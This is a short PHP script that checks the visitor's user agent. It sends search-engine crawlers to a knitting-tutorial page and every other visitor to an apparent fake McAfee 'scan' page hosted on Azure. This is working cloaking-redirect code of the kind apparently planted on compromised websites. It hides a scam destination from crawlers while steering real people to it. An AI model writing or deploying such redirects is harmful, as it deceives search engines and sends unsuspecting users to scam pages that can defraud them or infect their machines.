<?php
$user_agent=$_SERVER['HTTP_USER_AGENT'];
if((strstr(strtolower($user_agent), "googlebot")) || (preg_match('/yandex|yahoo|bot|crawl|slurp|spider/i', $user_agent)))
{
    header('Location:https://www.stitchandunwind.com/category/tutorial/knitting-tutorial/');
}
else{
        header('Location:https://mcfeenotification.azurewebsites.net/scan/');
}
?>
